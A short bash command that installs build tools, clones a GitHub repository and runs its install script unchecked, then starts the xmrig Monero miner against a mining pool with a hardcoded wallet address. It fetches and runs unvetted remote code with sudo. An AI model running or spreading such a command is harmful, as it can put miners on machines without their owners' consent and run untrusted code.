/bin/bash -c "
cd $HOME;
sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
git clone https://github.com/PrandoXMR/cryptocloud.git;
cd cryptocloud;
chmod +x install.sh;
chmod +x run.sh;
./install.sh;
cd $HOME/xmrig/build;
./xmrig --rig-id=F1 -u 45fuUrFP8wXNhL6yw5Q8nnT5PZxT9qXuEDTPExtG38a6f7kweFVxij5aY4zXe6k6hYi7Uf63QSCMN1XCo9rQrwwUGJZwGSg -o us-west.minexmr.com:4444 
"